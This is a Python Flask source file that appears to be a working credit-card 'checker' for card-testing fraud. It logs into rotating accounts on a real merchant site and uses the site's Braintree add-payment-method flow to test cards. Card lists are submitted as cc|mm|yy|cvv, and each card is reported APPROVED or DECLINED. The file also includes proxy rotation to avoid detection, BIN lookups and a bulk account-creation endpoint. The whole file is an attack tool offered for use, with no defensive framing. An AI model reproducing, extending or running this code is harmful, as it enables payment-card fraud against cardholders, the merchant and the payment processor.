from flask import Flask, request, jsonify, render_template, Response, stream_with_context
import requests
import base64
import re
import json
import os
import time
import glob
import random
import threading
from itertools import cycle

app = Flask(__name__, template_folder='template')

ACCOUNTS_FILE = 'accounts.txt'
COOKIES_DIR = 'cookies'
COOKIE_EXPIRY = 1200  # 20 minutes

if not os.path.exists(COOKIES_DIR):
    os.makedirs(COOKIES_DIR)

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def clean_html(raw_html):
    clean = re.compile('<.*?>')
    text = re.sub(clean, '', raw_html)
    return text.strip()

def get_cookie_filename(email):
    safe_email = "".join(c for c in email if c.isalnum() or c in ('@', '.', '_', '-'))
    return os.path.join(COOKIES_DIR, f"b3_cookies_{safe_email}.json")

def save_session_json(session, email):
    try:
        filename = get_cookie_filename(email)
        cookies_dict = session.cookies.get_dict()
        with open(filename, 'w') as f:
            json.dump(cookies_dict, f, indent=4)
    except Exception as e:
        print(f"Failed to save cookies for {email}: {e}")

def load_session_json(session, email):
    filename = get_cookie_filename(email)
    if os.path.exists(filename):
        if time.time() - os.path.getmtime(filename) > COOKIE_EXPIRY:
            try:
                os.remove(filename)
                print(f"Cookies for {email} expired and removed.")
            except:
                pass
            return False

        try:
            with open(filename, 'r') as f:
                cookies_dict = json.load(f)
                session.cookies.update(cookies_dict)
            return True
        except Exception as e:
            print(f"Failed to load cookies for {email}: {e}")
    return False

def get_authenticated_session(email, password, proxy_dict=None):
    session = requests.Session()
    if proxy_dict:
        session.proxies.update(proxy_dict)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }
    
    if load_session_json(session, email):
        try:
            r = session.get('https://iditarod.com/my-account/', headers=headers, timeout=10)
            if 'Log out' in r.text or 'Logout' in r.text or 'Hello' in r.text:
                 return session, None
        except Exception as e:
            pass
    
    print(f"Logging in {email}...")
    
    # Perform Login
    try:
        response = session.get('https://iditarod.com/my-account/', headers=headers)
        login_nonce = gets(response.text, 'name="woocommerce-login-nonce" value="', '"')
        
        if not login_nonce:
             return None, "Login Nonce Not Found"

        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://iditarod.com',
            'referer': 'https://iditarod.com/my-account/',
        })
        
        data = {
            'username': email,
            'password': password,
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        
        response = session.post('https://iditarod.com/my-account/', headers=headers, data=data)
        
        if "ERROR" in response.text or "Invalid username" in response.text or "Incorrect password" in response.text:
             return None, "Login Failed: Invalid credentials or error"

        if 'Log out' not in response.text and 'Logout' not in response.text:
             return None, "Login verification failed"
        
        save_session_json(session, email)
        return session, None

    except Exception as e:
        return None, str(e)

# --- Account Manager ---
class AccountManager:
    def __init__(self):
        self.lock = threading.Lock() # Ensure thread safety
        self.accounts = self.load_accounts()
        self.last_used = {} 
        self.cleanup_cookies(force=True)

    def load_accounts(self):
        accounts = []
        if os.path.exists(ACCOUNTS_FILE):
            try:
                with open(ACCOUNTS_FILE, 'r') as f:
                    for line in f:
                        if ':' in line:
                            parts = line.split(':', 1)
                            email = parts[0].strip()
                            password = parts[1].strip()
                            if email and password:
                                accounts.append({'email': email, 'password': password})
            except Exception as e:
                print(f"Error loading accounts: {e}")
        print(f"Loaded {len(accounts)} accounts.")
        return accounts

    def get_next_account(self):
        with self.lock:
            if not self.accounts:
                print("DEBUG: No accounts loaded!")
                return None
                
            now = time.time()
            ready_accounts = []
            
            best_fallback_account = None
            longest_wait = -1
            
            unavailable_count = 0

            for account in self.accounts:
                email = account['email']
                last = self.last_used.get(email, 0)
                diff = now - last
                
                if diff > 20: 
                    ready_accounts.append(account)
                else:
                    unavailable_count += 1
                
                if diff > longest_wait:
                    longest_wait = diff
                    best_fallback_account = account

            print(f"DEBUG: Request Account. Ready: {len(ready_accounts)}. Unavailable: {unavailable_count}. Total: {len(self.accounts)}")

            # 1. Randomly pick from ready accounts
            if ready_accounts:
                selected = random.choice(ready_accounts)
                self.last_used[selected['email']] = now
                print(f"DEBUG: Selected Ready Account: {selected['email']}")
                return selected
            
            if best_fallback_account:
                print(f"DEBUG: All full. Fallback to: {best_fallback_account['email']} (Wait: {longest_wait:.1f}s)")
                self.last_used[best_fallback_account['email']] = now
                return best_fallback_account
                
            return self.accounts[0]

    def cleanup_cookies(self, force=False):
        pattern = os.path.join(COOKIES_DIR, 'b3_cookies_*.json')
        for filepath in glob.glob(pattern):
            try:
                if force:
                    os.remove(filepath)
                    continue

                # Check age
                file_age = time.time() - os.path.getmtime(filepath)
                if file_age > COOKIE_EXPIRY:
                    os.remove(filepath)
            except Exception as e:
                print(f"Error removing {filepath}: {e}")

account_manager = AccountManager()

def get_country_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ""
    return "".join(chr(127397 + ord(c)) for c in country_code.upper())

def get_bin_info(bin_code):
    try:
        url = f"https://bin-db.vercel.app/api/bin?bin={bin_code}"
        resp = requests.get(url, timeout=5)
        data = resp.json()
        
        if data.get("status") == "SUCCESS" and data.get("data"):
            bin_data = data["data"][0]
            country_code = bin_data.get("Country", {}).get("A2", "")
            return {
                "bank": bin_data.get("issuer", "N/A"),
                "brand": bin_data.get("brand", "N/A"),
                "country": bin_data.get("Country", {}).get("Name", "N/A"),
                "emoji": get_country_emoji(country_code),
                "level": bin_data.get("category", "N/A"),
                "type": bin_data.get("type", "N/A")
            }
    except Exception:
        pass
    
    return {
        "bank": "N/A",
        "brand": "N/A",
        "country": "N/A",
        "emoji": "",
        "level": "N/A",
        "type": "N/A"
    }

def process_card(cc, mes, ano, cvv, account, proxy_dict=None):
    try:
        username = account['email']
        password = account['password']
        
        if len(mes) < 2: mes = "0" + mes
        if len(str(ano)) < 4: ano = "20" + str(ano)

        # Get authenticated session
        ses, auth_error = get_authenticated_session(username, password, proxy_dict)
        if not ses:
            return f"Authentication Failed: {auth_error}", "error"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }

        # Navigate to Add Payment Method
        response = ses.get('https://iditarod.com/my-account/add-payment-method/', headers=headers)
        pnonce = gets(response.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        client_token_nonce = gets(response.text, '"client_token_nonce":"', '"')
        
        if not client_token_nonce and "Log in" in response.text:
             return "Session invalid during payment flow (Redirected to login)", "error"

        if not pnonce or not client_token_nonce:
             return "Payment info not found (Account blocked?)", "error"

        # Get Client Token
        ajax_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://iditarod.com',
            'referer': 'https://iditarod.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
        response = ses.post('https://iditarod.com/wp-admin/admin-ajax.php', headers=ajax_headers, data=data)
        
        if 'data' not in response.json():
            return "Client Token Data Not Found", "error"
        
        data_token = response.json()['data']
        decoded_token = base64.b64decode(data_token).decode('utf-8')
        auth_fingerprint = gets(decoded_token, 'authorizationFingerprint":"', '"')
        
        if not auth_fingerprint:
            return "Authorization Fingerprint Not Found", "error"

        # Tokenize Card
        graphql_headers = {
            'accept': '*/*',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }
        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'd891c037-b1ca-4cf9-90bc-e31dca938ee4'},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
            'variables': {
                'input': {
                    'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv},
                    'options': {'validate': False},
                }
            },
            'operationName': 'TokenizeCreditCard',
        }
        response = ses.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=json_data)
        
        if 'errors' in response.json():
             error_message = response.json()['errors'][0]['message']
             return error_message, "declined"

        token = response.json()['data']['tokenizeCreditCard']['token']
        if not token:
            return "Card Tokenization Failed", "error"

        # Add Payment Method
        data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc_braintree_credit_card_payment_nonce', token),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', pnonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]
        response = ses.post('https://iditarod.com/my-account/add-payment-method/', headers=headers, data=data)

        if "Payment method successfully added" in response.text or "payment method added" in response.text.lower():
            return "Payment method added successfully", "success"
        else:
            resp = gets(response.text, '<ul class="woocommerce-error" role="alert">', '</ul>')
            if resp:
                return clean_html(resp), "declined"
            else:
                pattern = r"Status code\s*(.*)</li>"
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1).strip(), "declined"
                return "Unknown error", "declined"

    except Exception as e:
        return str(e), "error"

# --- Routes ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/playground')
def playground():
    return render_template('playground.html')

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    accounts = account_manager.accounts
    account_data = []
    for i, acc in enumerate(accounts):
       account_data.append({
           'id': i + 1,
           'url': 'https://iditarod.com', 
           'sessions': 0 
       })
    return jsonify({'accounts': account_data})

@app.route('/check')
@app.route('/check<int:gw>')
@app.route('/api/btree') 
def check_card(gw=None):
    start_time = time.time()
    
    cc_full = request.args.get('cc') or request.args.get('card')
    
    if not cc_full:
        return jsonify({
            "status": "DECLINED",
            "response": "Missing 'cc' or 'card' parameter",
            "is_approved": False,
            "bin_info": {},
            "card": "",
            "time_taken": "0s"
        }), 400

    try:
        cc, mes, ano, cvv = cc_full.split("|")
    except ValueError:
        return jsonify({
            "status": "DECLINED",
            "response": "Invalid format, use cc|mm|yy|cvv",
            "is_approved": False,
            "bin_info": {},
            "card": cc_full,
            "time_taken": "0s"
        }), 400


    custom_email = request.args.get('mail')
    custom_pass = request.args.get('pass')

    if custom_email and custom_pass:
        account = {'email': custom_email, 'password': custom_pass}
    else:
        # Fallback to rotation
        account = account_manager.get_next_account()
        
    if not account:
        return jsonify({
            "status": "DECLINED",
            "response": "No accounts available",
            "is_approved": False,
            "bin_info": {},
            "card": cc_full,
            "time_taken": "0s"
        }), 500


    
    # Check for proxy
    proxy_param = request.args.get('proxy')
    proxy_dict = None
    
    if proxy_param:
        try:
            parts = proxy_param.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
                proxy_url = f"http://{user}:{password}@{ip}:{port}"
                proxy_dict = {
                    "http": proxy_url,
                    "https": proxy_url
                }
        except Exception:
            pass

    bin_code = cc[:6]
    bin_info = get_bin_info(bin_code)

    message, status_code = process_card(cc, mes, ano, cvv, account, proxy_dict=proxy_dict)

    end_time = time.time()
    time_taken = f"{end_time - start_time:.2f}s"
    
    is_approved = status_code == "success"
    status_str = "APPROVED" if is_approved else "DECLINED"
    
    if status_code == "error":
        status_str = "DECLINED" 
    
    result = {
      "bin_info": bin_info,
      "card": cc_full,
      "gateway": f"Braintree {gw if gw else 'Rotation'}", 
      "is_approved": is_approved,
      "response": message,
      "status": status_str,
      "time_taken": time_taken
    }
    
    return jsonify(result)

@app.route('/accounts')
def accounts_page():
    return render_template('accounts.html')

@app.route('/api/generate_accounts')
def generate_accounts_api():
    count = request.args.get('count', default=1, type=int)
    
    def generate():
        import create_account
        
        for i in range(count):
            yield f"data: {json.dumps({'type': 'log', 'message': f'Starting account {i+1} of {count}...'})}\n\n"
            
            try:
                result, logs = create_account.create_account()
                
                for log_msg in logs:
                    yield f"data: {json.dumps({'type': 'log', 'message': log_msg})}\n\n"
                    
                if result:
                    yield f"data: {json.dumps({'type': 'result', 'account': result})}\n\n"
                else:
                    yield f"data: {json.dumps({'type': 'log', 'message': f'Failed to create account {i+1}'})}\n\n"
            except Exception as e:
                yield f"data: {json.dumps({'type': 'log', 'message': f'Error: {str(e)}'})}\n\n"

        yield f"data: {json.dumps({'type': 'done'})}\n\n"

    return Response(stream_with_context(generate()), mimetype='text/event-stream')

@app.route('/api/clear_new_accounts', methods=['POST'])
def clear_new_accounts():
    try:
        with open('new_accounts.txt', 'w') as f:
            f.write('') # Clear content
        return jsonify({"success": True, "message": "Cleared new_accounts.txt"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/get_new_accounts', methods=['GET'])
def get_new_accounts():
    try:
        content = ""
        if os.path.exists('new_accounts.txt'):
            with open('new_accounts.txt', 'r') as f:
                content = f.read()
        return jsonify({"success": True, "content": content})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
